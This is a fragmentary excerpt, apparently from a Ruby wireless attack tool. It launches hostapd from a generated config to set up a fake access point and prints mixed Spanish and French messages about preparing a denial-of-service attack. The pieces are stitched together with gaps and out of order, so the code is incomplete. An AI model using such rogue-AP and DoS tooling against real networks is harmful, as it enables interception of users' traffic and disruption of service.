...
sleep 1
`echo ghz > /tmp/hostbase-1.5ES/attack.txt`
...
EOF`
sleep 1   
        system "hostapd /tmp/hostapd.conf > /tmp/hostbase-1.5ES/hostapd.txt &> /dev/null &"
sleep 5
...
Setup.hostapdStart # on appelle la fonction dont on a besoin
sleep(5000000)        
...
class Setup
def self.hostapdStart
puts "\e[1;94m[*] Configuracion del fake AP...\e[0m"
`ifconfig wlan0 up`
...
sleep 4
puts "\e[1;32m[*] Fake AP creado... préparacion la DoS...\e[0m"
